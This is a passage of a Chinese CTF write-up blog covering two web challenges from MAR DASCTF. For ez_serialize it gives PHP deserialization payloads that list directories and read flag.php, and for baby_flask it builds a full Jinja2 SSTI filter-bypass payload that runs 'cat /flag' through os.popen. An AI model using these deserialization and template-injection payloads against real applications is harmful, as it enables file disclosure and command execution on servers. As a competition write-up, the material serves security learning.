class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"hello "</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure></div>
+
+<p>class A中construct()方法给变量设置了初始值，然后拼接了动态类（类名和参数都可控）并且实例化后输出结果。wakeup()方法实例化了class C，然后验证了$this-&gt;para和$this-&gt;class之后进行了拼接动态类、实例化、并且输出。class B没什么用，__construct()会输出$this-&gt;a。class C类用于过滤一些指定字符，不过这里过滤没什么用。</p>
+<p>利用PHP标准库 (SPL): <a href="https://www.php.net/manual/zh/book.spl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.spl.php</a></p>
+<p>首先利用<code>DirectoryIterator</code>或<code>FilesystemIterator</code>类去遍历目标的Web目录：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">'FilesystemIterator'</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator("/var/www/html")</span></span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">"/var/www/html/"</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$poc  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br></pre></td></tr></table></figure></div>
+
+<p>得到payload：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">1</span>:<span class="string">"A"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"class"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"FilesystemIterator"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"para"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"/var/www/html/"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"check"</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>执行后得到一个文件夹 1aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：</p>
+<p><img src="https://i.loli.net/2021/04/07/aRo8y2quPJVSWEe.png" alt="img"></p>
+<p>继续浏览这个目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"class"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"FilesystemIterator"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"para"</span>;<span class="string">s:</span><span class="number">47</span>:<span class="string">"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"check"</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/IpKjmSb1yuOQMXz.png" alt="img"></p>
+<p>然后我们使用 SplFileObject 类读取flag.php就行了：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"SplFileObject"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">$poc = <span class="keyword">new</span> A(); </span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到payload：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"class"</span>;<span class="attribute">s</span>:<span class="number">13</span>:<span class="string">"SplFileObject"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"para"</span>;<span class="attribute">s</span>:<span class="number">56</span>:<span class="string">"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/uKYGc2SULAkN9Qy.png" alt="img"></p>
+<h5 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a><strong>baby_flask</strong></h5><p>Jinja2 模板的 SSTI</p>
+<p>进入题目，是一个输出框。输入你的名字，然后随机返回给你一个幸运数字：</p>
+<p><img src="https://i.loli.net/2021/04/07/tVYgIuNidMkObvo.png" alt="img"></p>
+<p>猜测<code>/getname?name=</code> 处应该存在SSTI。查看源码，发现blacklist</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">Hi young boy!&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line">Do you like ssti?&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line"></span><br><span class="line">blacklist&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">'\'</span><span class="string">','</span><span class="comment">"',''\\','+',':','_',&lt;/br&gt;   </span></span><br><span class="line"><span class="string">'chr'</span>,<span class="string">'pop'</span>,<span class="string">'class'</span>,<span class="string">'base'</span>,<span class="string">'mro'</span>,<span class="string">'init'</span>,<span class="string">'globals'</span>,<span class="string">'get'</span>,&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'os'</span>,<span class="string">'popen'</span>,<span class="string">'open'</span>,<span class="string">'read'</span>,&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'select'</span>,<span class="string">'url_for'</span>,<span class="string">'get_flashed_messages'</span>,<span class="string">'config'</span>,<span class="string">'request'</span>,&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'count'</span>,<span class="string">'length'</span>,<span class="string">'０'</span>,<span class="string">'１'</span>,<span class="string">'２'</span>,<span class="string">'３'</span>,<span class="string">'４'</span>,<span class="string">'５'</span>,<span class="string">'６'</span>,<span class="string">'７'</span>,<span class="string">'８'</span>,<span class="string">'９'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>&lt;/<span class="keyword">br</span>&gt;    </span><br><span class="line">&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>过滤的比较多，但还是可以绕过的</p>
+<p>Payload构造过程如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TWIG"><figure class="iseeu highlight /twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"># 首先构造出所需的数字: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="xml">    # 0, 也可以使用lenght过滤器获取数字</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="xml">    # 1</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 2</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="xml">    # 4</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="xml">    # 5</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="xml">    # 3</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="xml">    # 9</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 7</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 构造出所需的各种字符与字符串: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="xml">    # 空格</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="xml">    # .</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 字符 c</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 百分号 %</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="xml">    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="xml">    # 使用%c构造斜杠 /</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="xml">    # 使用%c构造引号 '</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="xml">    # 使用%c构造下划线 _</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="xml">    # 使用%c构造右括号 )</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="xml">    # 使用%c构造左括号 (</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # import</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # popen</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # os</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # cat</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # flag</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # read</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="xml">    # __builtins__</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # init</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # items</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="xml"> </span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="xml">				</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="xml">    # eval("__import__('os').popen('cat /flag').read()")</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 最后的payload如下:</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+
+    </div>
+
+    
+    
+    
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------本文结束<i class="fa fa-heart"></i>感谢阅读----------------</div>
+    
+</div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/01/CVE-2021-3156-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2021-3156 提权漏洞复现">
+      <i class="fa fa-chevron-left"></i> CVE-2021-3156 提权漏洞复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/11/CVE-2021-3129-Laravel%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="next" title="CVE-2021-3129 Laravel远程代码执行漏洞">
+      CVE-2021-3129 Laravel远程代码执行漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MAR-DASCTF明御攻防赛"><span class="nav-number">1.</span> <span class="nav-text">MAR DASCTF明御攻防赛</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#BestDB"><span class="nav-number">1.1.1.</span> <span class="nav-text">BestDB</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ez-login"><span class="nav-number">1.1.2.</span> <span class="nav-text">ez_login</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ez-serialize"><span class="nav-number">1.1.3.</span> <span class="nav-text">ez_serialize</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#baby-flask"><span class="nav-number">1.1.4.</span> <span class="nav-text">baby_flask</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="As1def"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">As1def</p>
+  <div class="site-description" itemprop="description">听懂了一首歌,生活中回响着旋律</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/As1def" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:why.asldef@qq.com" title="E-Mail → mailto:why.asldef@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://plus.google.com/As1def" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/brianchen2006" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;brianchen2006" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa ||fa-user"></i>
+  </span>
